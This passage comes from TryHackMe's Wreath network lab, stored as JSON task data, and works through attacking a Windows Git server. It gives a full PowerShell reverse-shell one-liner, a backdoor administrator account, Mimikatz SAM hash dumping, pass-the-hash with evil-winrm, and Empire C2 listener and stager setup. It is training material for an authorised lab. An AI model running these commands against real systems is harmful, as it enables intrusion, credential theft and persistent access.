icmp</code><br /></p><p><i><b>Note:</b> if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using </i><code>ip -a link</code><i> to see the available interfaces.<br /></i></p><p>Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):<br /><code>ping -n 3 ATTACKING_IP<br /></code></p><p>This will send three ICMP ping packets back to you.</p>How many make it to the waiting listener?', 'hint': ''}, {'questionNo': 6, 'question': '<p></p><p>Looks like we\'re going to need to think outside the box to catch this shell.</p><p>We have two easy options here:</p><ul><li> Given we have a fully stable shell on .200, we could upload a static copy of <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" target="_blank">netcat</a> and just catch the shell here</li><li>We could set up a relay on .200 to forward a shell back to a listener</li></ul>It\n is up to you which option you choose (although for the sake of \npractice, a socat relay is suggested); however, whichever way you \nchoose, please be mindful of other users at earlier stages of the network \nand <b>ensure that any ports you open are above 15000.</b><p></p><p>Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:<br /><code>firewall-cmd --zone=public --add-port PORT/tcp</code><br />Substituting in your desired choice of port.</p><p>In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).<br /></p><p>With that done, set up either a listener or a relay on .200.<br /></p>', 'hint': 'Either upload a static copy of netcat, or perform a socat relay (described in task 13). If performing a socat relay you will need to relay the connection back to an open port on your attacking machine.'}, {'questionNo': 7, 'question': '<p>Let\'s go for a reverse shell!</p><p>We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the <code>.200</code> firewall in the previous question where it says IP and PORT:<br /><code>powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient(\'IP\',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'&gt; \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code><br /></p><p>As this is a web exploit, we now have to URL encode the shell command. If using Burpsuite, you can do this by pasting the command in as the value for the "a" parameter, then selecting it and pressing Ctrl + U:<br /><img style="width:783px" alt="Using Burpsuite to encode the payload with Ctrl + U" src="https://assets.tryhackme.com/additional/wreath-network/f670383bd3e5.png" /></p><p>If you are using cURL then there are a variety of options available. cURL does provide a <code>--data-urlencode</code> switch; however, it\'s often easiest to just use a <a href="https://www.urlencoder.org/" target="_blank">website</a> to encode the shell command, then copy it in with the <code>-d</code> switch:<br /><img style="width:920.3px" alt="Sending the payload with cURL" src="https://assets.tryhackme.com/additional/wreath-network/be3ea7bf0fe6.png" /><br /></p><p>Pick a method (cURL, BurpSuite, or any others) and get a shell!<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-warning size-16">Git Server</span> Stabilisation &amp; Post Exploitation', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/GOOYZCX6yY4" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>In the last task we got remote command execution running with the highest permissions possible on a local Windows machine, which means that we do not need to escalate privileges on this target.</p><p>In the upcoming tasks we will be looking at the second teaching point of this network -- the command and control framework: Empire. Before we do that though, let\'s consolidate our position a little.</p><p>From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).</p><p>Specifically, we need a user account (as opposed to the service account which we\'re currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will. <br /></p><p>We already have the ultimate access, so let\'s create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don\'t use <i>anywhere </i>else.</p><p>First we create the account itself:<br /><code>net user USERNAME PASSWORD /add</code><br /></p><p>Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:<br /><code>net localgroup Administrators USERNAME /add<br />net localgroup "Remote Management Users" USERNAME /add<br /></code></p><p><img style="width:608px" alt="Adding a new user" src="https://assets.tryhackme.com/additional/wreath-network/5b8e4ccaed23.png" /><br /></p><p>We can now use this account to get stable access to the box!<br /></p><p></p><hr /><p></p><p>As mentioned previously, we could use either RDP or WinRM for this.</p><p><i><b>Note: </b>Whilst the target is set up to allow multiple sessions over RDP, for the sake of other users attacking the network in conjunction with memory limitations on the target, it would be appreciated if you stuck to the CLI based WinRM for the most part. We will use RDP briefly in the next section of this task, but otherwise please use WinRM when moving forward in the network.<br /></i></p><p>Let\'s access the box over WinRM. For this we\'ll be using an awesome little tool called <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">evil-winrm</a>.</p><p>This does not come installed by default on Kali, so use the following command to install it from the Ruby Gem package manager:<br /><code>sudo gem install evil-winrm</code></p><p>With evil-winrm installed, we can connect to the target with the syntax shown here:<br /><code>evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP </code></p><p><img style="width:1075px" alt="Authenticating with Evil-WinRM" src="https://assets.tryhackme.com/additional/wreath-network/28b967dedffa.png" /><br /><br /><i>If you used an SSH portforward rather than sshuttle to access the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also need to specify the target port using the -P switch (e.g. -</i><code>i 127.0.0.1 -P 58950</code><i>).</i></p><p>Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won\'t actually be able to perform administrative actions with it via winrm.<br /><i></i></p><hr /><p>Now let\'s look at connecting over RDP for a GUI environment. </p><p>There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can install xfreerdp with the command:<br /><code>sudo apt install freerdp2-x11</code></p><p>As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:<br /><code>xfreerdp /v:IP /u:USERNAME /p:PASSWORD</code></p><p>For example:<br /><code>xfreerdp /v:172.16.0.5 /u:user /p:\'password123!\'</code></p><p>Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.<br /></p><p>When authentication has successfully taken place, a new window will open giving GUI access to the target.<br /><img style="width:1049px" alt="Demonstration of logging in over RDP" src="https://assets.tryhackme.com/additional/wreath-network/a40854512a5e.png" /></p><p>That said, we can do a <i>lot</i> more with xfreerdp. These switches are particularly useful:-</p><ul><li><code>/dynamic-resolution</code> -- allows us to resize the window, adjusting the resolution of the target in the process</li><li><code>/size:WIDTHxHEIGHT</code> -- sets a specific size for targets that don\'t resize automatically with <code>/dynamic-resolution</code></li><li><code>+clipboard</code> -- enables clipboard support</li><li><code>/drive:LOCAL_DIRECTORY,SHARE_NAME</code> -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called <code>share</code>, you could use: <code>/drive:.,share</code>, with the period (<code>.</code>) referring to the current directory<br /></li></ul><p>When creating a shared drive, this can be accessed either from the command line as <code>\\\\tsclient\\</code>, or through File Explorer under "This PC":<br /><img style="width:636px" alt="Showing the share created by xfreerdp when specifying /drive" src="https://assets.tryhackme.com/additional/wreath-network/9cd2021f9d36.png" /></p><p>Note that the name of the share will change according to what you selected in the <code>/drive</code> switch.</p><p>A useful directory to share is the <code>/usr/share/windows-resources</code> directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:<br /><code>xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share</code><br /></p><hr /><p>With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a <code>cmd.exe</code> or <code>PowerShell</code> window <i>as an administrator</i> (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:<br /><code>\\\\tsclient\\share\\mimikatz\\x64\\mimikatz.exe</code><br /><img style="width:620px" alt="Accessing mimikatz via the RDP share" src="https://assets.tryhackme.com/additional/wreath-network/fcb90c0d6fc5.png" /></p><p><i><b>Note: </b>if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with </i><code>sudo apt install mimikatz</code><i>.</i></p><p>With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:<br /><code>privilege::debug<br />token::elevate</code><br /><img style="width:1075px" alt="Elevating privileges in mimikatz" src="https://assets.tryhackme.com/additional/wreath-network/ce71a0375943.png" /><br /></p><p>If we want we could log Mimikatz output with the <code>log</code> command. For example: <code>log c:\\windows\\temp\\mimikatz.log</code>, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.<br /></p><p>We can now dump all of the SAM local password hashes using:<br /><code>lsadump::sam</code><br /></p><p>Near the top of the results you will see the Administrator\'s NTLM hash:<br /><img style="width:468px" alt="Dumping credentials with lsadump::sam" src="https://assets.tryhackme.com/additional/wreath-network/7e1e0a52e601.png" /><br /></p><p>Jackpot!<br /></p><p></p>', 'taskType': 'none', 'taskNo': 21, 'taskCreated': '2021-01-18T19:26:33.555Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Create an account on the target. Assign it to the <code>Administrators</code> and <code>Remote Management Users</code> groups.<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Authenticate with WinRM -- make sure you can get a stable session on the target.<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Authenticate with RDP, sharing a local copy of Mimikatz, then dump the password hashes for the users in the system.</p>What is the Administrator password hash?<br />', 'hint': ''}, {'questionNo': 4, 'question': '<p>What is the NTLM password hash for the user "Thomas"?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>You won\'t be able to crack the Administratrator hash, but let\'s try cracking Thomas\' password hash. Tools such as Hashcat or John the Ripper are versatile and good for most password cracking situations; however, the unsalted NTLM password hash we have in our possession can be cracked using a much simpler method. </p><p>Sites such as <a href="https://crackstation.net" target="_blank">Crackstation</a> perform password <i>lookups.</i> In other words, they store a huge database of password/hash combinations, meaning that they can take a hash and instantly look up the already cracked password. </p><p>Use Crackstation to break Thomas\' hash!</p><p><img style="width:920.3px" alt="Cracking Thomas\' hash in CrackStation" src="https://assets.tryhackme.com/additional/wreath-network/ddb9216f5dd4.png" /></p><p><i><b>Note: </b>It should go without saying that you should never enter client password hashes into an online cracking tool in the real world. Crackstation is very good to quickly find the password in this context, however. Instead we would be more likely to crack the hashes locally using something like Hashcat -- or better yet, pass them over to a very powerful computer owned by our employers, designed to crack passwords quickly.</i><br /></p><p>What is Thomas\' password?<br /></p>', 'hint': ''}, {'questionNo': 6, 'question': '<p>In the real world this would be enough to obtain stable access; \nhowever, in our current environment, the new account will be deleted if \nthe network is reset.</p><p>For this reason you are encouraged to to \nuse the evil-winrm built-in pass-the-hash technique using the \nAdministrator hash we looted.</p><p>To do this we use the <code>-H</code> switch <i>instead of</i> the <code>-p</code> switch we used before.</p><p>For example:<br /><code>evil-winrm -u Administrator -H ADMIN_HASH -i IP</code><br /></p><p><img style="width:855px" alt="Pass the hash with Evil-WinRM" src="https://assets.tryhackme.com/additional/wreath-network/db2e05f41573.png" /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Introduction', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/YV1hg4fnInA" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left"><i><b>Note:</b> If you are using the AttackBox then you are advised to skip to Task 32. The way that Empire is installed in the AttackBox is not representative of the recommended method -- a necessary design choice which was made to accommodate other software running on the machine. If you are comfortable working with Docker (and changing the instructions in the following tasks to accommodate accordingly) then feel free to read on. Otherwise please skip to the next section.</i></p><hr /><p align="left">So, we have a stable shell. What now?</p><p align="left">With a foothold in a target network, we can start looking to bring what is known as a <i>C2 (Command and Control) Framework </i>into\n play. C2 Frameworks are used to consolidate an attacker\'s position within\n a network and simplify post-exploitation steps (privesc, AV \nevasion, pivoting, looting, covert network tactics, etc), as well as providing red teams with extensive collaboration features. There are many C2 Frameworks \navailable. The most famous (and expensive) is likely <a href="https://www.cobaltstrike.com/" target="_blank">Cobalt Strike</a>; however, there are many others, including the .NET based <a href="https://github.com/cobbr/Covenant" target="_blank">Covenant</a>, <a href="https://github.com/Ne0nd0g/merlin" target="_blank">Merlin</a>, <a href="https://github.com/bats3c/shad0w" target="_blank">Shadow</a>, <a href="https://github.com/nettitude/PoshC2" target="_blank">PoshC2</a>, and many others. An excellent resource for finding (and filtering) C2 frameworks is <a href="https://www.thec2matrix.com/" target="_blank">The C2 Matrix</a>, which provides a great list of the pros and cons of a huge number of frameworks.<br /></p><p align="left">We\n have a system shell on a Windows host, making this an ideal time to \nintroduce the second of our three teaching topics: the C2 Framework \n"Empire".</p><p align="left">Powershell Empire is, as the name suggests, a framework \nbuilt primarily to attack Windows targets (although especially with the advent of dotnet core, more and more of the functionality may become usable in other systems). It provides a wide range of \nmodules to take initial access to a network of devices, and turn\n it into something <i>much</i> bigger. In this section we will be \nlooking at the principles of PS Empire, as well as how to use it (and \nits GUI interface: Starkiller) to improve our shell and perform \npost-exploitation techniques on the Git Server.</p><p align="left">The Empire project was originally abandoned in early 2019; however, it was soon picked up by a company called <a href="https://www.bc-security.org/" target="_blank">BC-Security</a>,\n who have maintained and improved it ever since. As such, there are \nactually two public versions of Empire -- the original (now very outdated), and the current BC-Security fork. Be careful to get the right one!</p><p align="left"><i><b>Note:</b> this material was originally written for Empire 3.x, but has been updated in response to the release of Empire 4.x which has a very different way of operating. Make sure to use Empire 4.x if following along with these materials.</i><br /></p><p align="left">We will be looking into \nboth Empire and its GUI extension: "Starkiller". Empire is the original \nCLI based framework but has now been split into a <i>server</i> mode and a <i>client</i> mode. Starkiller is a more recent addition to the toolbox, and can be used instead of (or as well as) the Empire client CLI program. <br /></p>', 'taskType': 'none', 'taskNo': 22, 'taskCreated': '2021-01-09T02:16:57.795Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the introduction.<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Empire: Installation', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/yXQoIQ8oeLo" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">Starkiller and Empire (via Docker) are both already installed on the TryHackMe AttackBox, so if you are not using your own machine then you can skip this task.<br /></p><hr /><p align="left">That said, if we are using our own VM then we need to install both Empire and Starkiller before we use them. Ultimately it\'s up to you which you use; both will be covered in the tasks. Regardless, we need to install at least Empire. </p><p align="left">In ages past this was a much more complicated process involving the Git repo and setup scripts. These days it\'s easiest to just use the apt repositories:</p><p align="left"><code>sudo apt install powershell-empire starkiller</code><br /></p><p align="left">With both installed, we now need to start an Empire server. This should stay running in the background whenever we want to use either the Empire Client or Starkiller:<br /><code>sudo powershell-empire server</code><br /></p><p align="left">The server should now start:<br /><img alt="Formatted command line output of Empire server starting" style="width:821px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2a7488301af1.png" /></p><p align="left">It would be more common to have an Empire server running on a separate C2 server (usually hosted locally with cloud infrastructure linking back to receive inbound connections through). Multiple pentesters or red teamers would then be able to connect to a single central server.</p><p align="left">This is entirely overkill for our uses here -- instead we will just run both the server and the client application(s) on the single Kali instance.<br /></p><hr /><p align="left">With the server started, let\'s get the Empire CLI Client working. You are welcome to skip this if you would prefer to work exclusively in Starkiller.</p><p align="left">Starting the Empire CLI Client is as easy as:<br /><code>powershell-empire client</code><br /><img alt="Demonstration of connecting with the Empire CLI Client" style="width:712px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ba333000239e.png" /><br /></p><p align="left">With the server instance hosted locally this should connect automatically by default. If the Empire server was on a different machine then you would need to either change the connection information in the <code>/usr/share/powershell-empire/empire/client/config.yaml</code> file, or connect manually from the Empire CLI Client using <code>connect HOSTNAME --username=USERNAME --password=PASSWORD</code>.</p><hr />Starkiller is an Electron app which works by connecting to the REST API exposed by the Empire server<p></p><p align="left">With an Empire server running, we can start Starkiller by executing "<code>starkiller</code>" in a new terminal window:<br /><img style="width:1075px" alt="Initial connection to Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/57827141bfe4.png" /></p><p></p><p align="left">From here we need to sign into the REST API we deployed previously. By default this runs on <code>https://localhost:1337</code>, with a username of <code>empireadmin</code> and a password of <code>password123</code>:<br /><img style="width:1075px" alt="Starkiller connection with credentials (empireadmin:password123) shown" src="https://assets.tryhackme.com/additional/wreath-network/9a2bc8733ee0.png" /><br /></p><p></p>', 'taskType': 'none', 'taskNo': 23, 'taskCreated': '2021-01-09T22:22:19.409Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Install and execute Empire/Starkiller<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Empire: Overview', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/9cfVFaH3Ty0" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">Powershell Empire has several major sections to it, which we will be covering in the upcoming tasks.</p><div align="left"><ul><li><b>Listeners</b> are fairly self-explanatory. They listen for a connection and facilitate further exploitation</li><li><b>Stagers</b>\n are essentially payloads generated by Empire to create a robust reverse\n shell in conjunction with a listener. They are the delivery mechanism \nfor agents<br /></li><li><b>Agents</b> are the equivalent of a Metasploit \n"Session". They are connections to compromised targets, and allow an \nattacker to further interact with the system</li><li><b>Modules</b> are \nused to in conjunction with agents to perform further exploitation. For \nexample, they can work through an existing agent to dump the password \nhashes from the server </li></ul></div><p align="left">Empire also allows us to add in custom <b>plugins</b> which extend the functionality of the framework in various ways; however, we will not be covering this in the upcoming content.</p><p align="left">In\n addition to these practical applications of the framework, it also has a\n nifty credential storage facility, automatically storing any found \ncreds in a local database, plus many other neat features! Many of these extra features (such as the messaging functionality) are tailored for teams attacking a target; we will not be covering these collaborative features in much detail, but you are encouraged to look at them for yourself!<br /></p><p align="left">There\n is a problem though. As established previously, our target (the Git \nServer) does not have the ability to connect directly to our attacking \nmachine. Due to how Empire handles pivoting, we will need to set up a \nspecial kind of listener, so before we do that, we will learn the \n"normal" process for setting up Empire and Starkiller using the already \ncompromised Webserver as a target. Once we have a handle on how Empire \noperates, we will switch focus to our primary target: the Git Server.<br /></p><p align="left">In\n each of the following tasks, we will cover the relative section in both\n the Empire CLI and the Starkiller GUI. You are welcome to pick \nwhichever one you prefer -- or follow along with both!<br /></p><p align="left">Let\'s set up our first listener!<br /></p><p align="left"><br /></p>', 'taskType': 'none', 'taskNo': 24, 'taskCreated': '2021-01-10T17:04:37.678Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the overview<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Can we get an agent back from the git server directly (Aye/Nay)?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Empire: Listeners', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/d0PDMkeVEW4" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">Listeners in Empire are used to receive connections from stagers (which we\'ll look at in the next task). The default listener is the <code>HTTP</code> listener. This is what we will be using here, although there are many others available. It\'s worth noting that a single listener can be used more than once -- they do not die after their first usage.</p><hr align="left" /><p align="left">Let\'s start by setting up a listener in the Empire CLI Client.</p><p align="left">Having started the client, we are met with the following menu:<br /><img alt="Demonstration of connecting with the Empire CLI Client" style="width:712px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ba333000239e.png" /></p><p align="left">To select a listener we would use the <code>uselistener</code> command. To see all available listeners, type <code>uselistener\xa0</code> (making sure to include the space at the end!) -- this should bring up a dropdown menu of available listeners:<br /><img alt="Dropdown showing the listeners available" style="width:336px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ecc40f11478c.png" /><br /></p><p align="left"> When you\'ve picked a listener, type <code>uselistener LISTENER</code> and press enter to select it; alternatively, the up and down arrow keys can also be used to traverse the dropdown, with the chosen listener again being selected by pressing enter. Here we will be using the <code>http</code> listener (the most common kind), so we use <code>uselistener http</code>:<br /><img alt="Screenshot showing the options table for the selected listener" style="width:659px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/e79c26064a34.png" /><br /></p><p align="left">This brings up a huge table of options for the listener. If we need to see an updated copy of this table (having set options, for example), we can access it again with the <code>options</code> command when in the context of the listener.</p><p align="left">The syntax for setting options is identical to the Metasploit module options syntax -- <code>set OPTION VALUE</code>. Once again, a dropdown will appear showing us the available options after we type <code>set\xa0 </code>.<br /></p><p align="left">Set a new name for the listener. This allows us to easily identify it later -- especially if we have several open. It is not essential, however, and can be left at the default <code>http</code> if preferred. <br /></p><p align="left">That said, some options <i>must</i> be set. At a bare minimum we must set the host (to our own IP address) and port:<br /><img alt="Demo of setting the options for name, host and port" style="width:421px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/a5d0eb75224f.png" /><br /></p><p align="left">Bear in mind that option names are case sensitive in Empire. </p><p align="left">Many of the other options presented here are extremely useful, so it\'s well worth learning what they do and how they can be applied.<br /></p><p align="left">With the required options set, we can start the listener with: <code>execute</code>. We can then exit out of this menu using <code>back</code>, or exit to the main menu with <code>main</code>.<br /></p><p align="left">To view our active listeners we can type listeners then press enter:<br /><img style="width:712px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/9e5c79b3eec7.png" /><br /></p><p align="left">When we want to stop a listener, we can use <code>kill LISTENER_NAME</code> to do so --\xa0 a dropdown menu with our active listeners will once again appear to assist.<br /></p><hr align="left" /><p align="left">We have a listener in the Empire CLI; now let\'s do the same thing in Starkiller!</p><p align="left">When we first launched Starkiller, we were placed automatically in the Listeners menu:<br /><img style="width:1075.53px" alt="The listeners menu of Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/d8d7fd792211.png" /><br /></p><p align="left">The process of creating a listener with the GUI is very intuitive. Click the "Create " button.</p><p align="left">In the menu that pops up, set the Type to <code>http</code>, the same as with the Empire Listener we created before. Several new options will appear:<br /><img style="width:525px" alt="Available options for listeners in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/efec537b41f2.png" /></p><p align="left">Notice that these options are identical to those we saw earlier in the CLI version.</p><p align="left">Once again, set the Name, Host, and Port for the listener (make sure to use a different port from previously if you already have an Empire listener started!):<br /><img style="width:517px" alt="Setting the name, host, and port options for the Starkiller listener" src="https://assets.tryhackme.com/additional/wreath-network/4ac9e0c14358.png" /><br /></p><p align="left">With the options set, click "Submit" at the top of the page, then go back to the Listeners menu by clicking on "Listeners" at the top left of the page. Back on the main Listeners page you will see your created listener!<br /><img style="width:1075px" alt="The listeners menu with the Starkiller listener started" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8d93b44295ba.png" /><br /></p><p align="left"><i><b>Note:</b> if you also have a listener set up in Empire, this will also show up here.</i></p>', 'taskType': 'none', 'taskNo': 25, 'taskCreated': '2021-01-10T22:59:21.368Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Start a listener in Empire and/or Starkiller<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Empire: Stagers', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/32OpGDlJBDg" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">Stagers are Empire\'s payloads. They are used to connect back to waiting listeners, creating an agent when executed.<br /></p><p align="left">We can generate stagers in either Empire CLI or Starkiller. In most cases these will be given as script files to be uploaded to the target and executed. Empire gives us a huge range of options for creating and obfuscating stagers for AV evasion; however, we will not be going into a lot of detail about these here.</p><hr align="left" /><p align="left">Let\'s first look at generating stagers in the Empire CLI application.</p><p align="left">From the main Empire prompt, type <code>usestager\xa0</code> (including the space!)\xa0 to get a list of available stagers in a dropdown menu.<br /></p><p align="left">There are a variety of options here. When in doubt, <code>multi/launcher</code> is often a good bet. In this case, let\'s go for <code>multi/bash</code> (<code>usestager multi/bash</code>):<br /><img style="width:743px" alt="Showing the options for usestager multi/bash after selection" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ce5729866d07.png" /><br /></p><p align="left">As with listeners, we set options with <code>set OPTION VALUE</code>. There are many options here, but the only thing we need do is set the listener to the name of the listener we created in the previous task, then tell Empire to <code>execute</code>, creating the stager in our <code>/tmp</code> directory:<br /><img style="width:954px" alt="Setting the listener to connect to, then executing the stager" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/3e295bf67fb9.png" /><br /></p><p align="left">We now need to get the stager to the target and executed, but that is a job for later on. In the meantime we can save the stager into a file on our own attacking machine then once again exit out of the stager menu with <code>back</code>.</p><hr align="left" /><p align="left">Not unexpectedly, the process for generating stagers with Starkiller is almost identical.<br /></p><p align="left">First we switch over to the Stagers menu on the left hand side of the interface:<br /><img style="width:499px" alt="Showing the stagers menu on the left hand side of the Starkiller interface" src="https://assets.tryhackme.com/additional/wreath-network/8a10ffe7d3be.png" /><br /></p><p align="left">From here we click "Create" and once again select <code>multi/bash</code>.<br /></p><p align="left">We select the Listener we created in the previous task, then click submit, leaving the other options at their default values:<br /><img style="width:100%" alt="Setting the Listener name, then executing the stager" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/15e298c934fb.png" /><br /></p><p align="left"> This brings us back to the stagers main menu where we are given the option to copy the stager to the clipboard by clicking on the "Actions" dropdown and selecting "Copy to Clipboard":<br /><img style="width:909px" alt="Highlighting the button allowing us to copy the stager to the clipboard" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/71a9dfe8dffa.png" /></p><p align="left">Once again we would now have to execute this on the target.<br /></p>', 'taskType': 'none', 'taskNo': 26, 'taskCreated': '2021-01-10T22:59:52.410Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p align="justify">Using your choice of Empire CLI or Starkiller, generate a <code>multi/bash</code> stager and save it as a file on your own disk.<br /></p>', 'hint': ''}, {'questionNo': 2, 'question': '<p align="left"><b>Bonus Question (Optional):</b> Read through the code in the script and see if you can decipher what it is doing. You will need to decode the payload from Base64 before doing so.<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(123,198,252,.18);color:#7bc6fc">Command and Control</span> Empire: Agents', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/T9Pr9pPjdMM" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p align="left">Now that we\'ve started a listener and created a stager, it\'s time to put them together to get an agent!</p><p align="left">We\'ve been building up towards getting an agent on the compromised webserver, so let\'s do that now.</p><hr align="left" /><p align="left">The process for this is identical whether we are using Starkiller or Empire Client. We need to get the file to the target and executed.</p><p align="left">There are a variety of ways we could do this. The simplest would simply be to use your preferred CLI text editor to create a file on the target, copy and paste the script in, then execute it. If using this method, please do it in the /tmp directory and follow the <code>FILENAME-USERNAME.sh</code> naming convention. We could also use something called a <i><a href="https://tldp.org/LDP/abs/html/here-docs.html" 